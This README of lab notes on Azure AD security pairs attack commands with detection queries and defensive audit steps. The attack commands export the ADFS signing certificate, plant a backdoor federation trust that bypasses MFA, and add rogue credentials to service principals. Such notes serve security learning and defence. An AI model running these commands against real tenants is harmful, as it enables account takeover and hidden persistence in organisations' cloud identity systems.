# AzureAD Security 

Quick notes from lab on Azure AD security  

## Attack

### Export ADFS certificate
Export-AADIntADFSSigningCertificate -filename ADFSSigningCertificate.pfx  

#### More info 

$ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService  
$conn = $ADFS.ConfigurationDatabaseConnectionString  
$SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn  
$SQLclient.Open()  
$SQLcmd = $SQLclient.CreateCommand()  
$SQLcmd.CommandText = "SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings"  
$SQLreader = $SQLcmd.ExecuteReader()  
$SQLreader.Read() | Out-Null  
$settings=$SQLreader.GetTextReader(0).ReadToEnd()  
$SQLreader.Dispose()  
\[xml\]$xml=$settings  

### Adding a malicious federation trust
Get-AADIntAccessTokenForAADGraph -savetocache                                                                       
ConvertTo-AADIntBackdoor -domain maliciousdomain.com     
get-msoluser | select UserPrincipalName, ImmutableId  
Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer ISSUER  

(AuditLogs | where OperationName =~ "Set domain authentication")  
(AuditLogs | where OperationName =~ "Set federation settings on domain" )  

## Adding credentials to a service principle 

### Certificate 
$cert = New-SelfSignedCertificate -dnsname some.domain.com -CertStoreLocation cert:\LocalMachine\My -Provider “Microsoft Enhanced RSA and AES Cryptographic Provider”  
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())   
$sp = get-azureadserviceprincipal -searchstring SEARCHSTRING  
New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
Connect-AzureAD  -Tenant TENANTID -ApplicationID APPID -CertificateThumbprint CERTTHUMBPRINT  

(AuditLogs | where OperationName =~ "Update service principal")
(AuditLogs | where OperationName =~ "Add service principal credentials")

### Password
New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "01-01-2030 12:00:00" -StartDate "04-04-2020 12:00:00"  -Value PASSWORD  

(AuditLogs | where OperationName =~ "Update service principal")
(AuditLogs | where OperationName =~ "Add service principal credentials")

### Create a new service principle 
Get-AzureADServicePrincipal -all $true | Where-Object{$_.KeyCredentials -ne $null}  
$sp = New-AzADServicePrincipal -DisplayName 'MicrosoftSyncShare'  

## Defence 

Install-module azureadpreview
Connect-AzureAD  

Install-module ExchangeOnlineManagement
Connect-ExchangeOnline

Install-module MSOnline
Connect-MsolService  

### Auditing federation trusts
Azure AD  
Get-MsolDomain | Select * / Get-AzureADDomain | Select *  
Get-MsolFederationProperty (need to run this for each domain)  
Exchange Online  
Get-FederationTrust | Format-List
Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo  
Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo | select-object -expandproperty Domains  

### Auditing service principles
Get-AzureADServicePrincipal  
Get-AzureADServicePrincipal -all $true | Select *  
Get-AzureADServicePrincipal -all $true | Where-Object{$_.KeyCredentials -ne $null} | Select *  
Get-AzureADServicePrincipal -all $true | Where-Object{$_.PasswordCredentials -ne $null} | Select *   

Reference for permissions - https://github.com/mepples21/azureadconfigassessment / https://github.com/mepples21/azureadconfigassessment/blob/master/permissiontable.csv

### Sentinel connectors
AzureActiveDirectory  
SecurityEvents  
Office365  
Microsoft 365 Defender  

### Other useful commands
Get-AADIntLoginInformation -Domain domain.com  
Get-AzureADTenantDetail | Select *  

### CISA Sparrow
https://github.com/cisagov/Sparrow/blob/develop/Sparrow.ps1  
Invoke-WebRequest 'https://github.com/cisagov/Sparrow/raw/develop/Sparrow.ps1' -OutFile 'Sparrow.ps1' -UseBasicParsing  

### Crowdstrike CRT
https://github.com/CrowdStrike/CRT/blob/main/Get-CRTReport.ps1  
https://www.crowdstrike.com/blog/crowdstrike-launches-free-tool-to-identify-and-help-mitigate-risks-in-azure-active-directory/  

App vs Service principal

https://docs.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals#:~:text=principal%20object's%20properties.-,Relationship%20between%20application%20objects%20and%20service%20principals,use%20in%20a%20specific%20tenant.

https://twitter.com/SwiftOnSecurity/status/1217942428243632128?s=20  

https://www.youtube.com/watch?v=fpUZJxFK72k  

https://dirkjanm.io/talks/  

https://www.youtube.com/watch?v=SG2ibjuzRJM  

https://www.youtube.com/watch?v=JEIR5oGCwdg  

https://www.youtube.com/watch?v=LufXEPTlPak  

https://vimeo.com/214855977  

https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/  

https://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html

https://www.youtube.com/watch?v=tJkjOnxcw6w


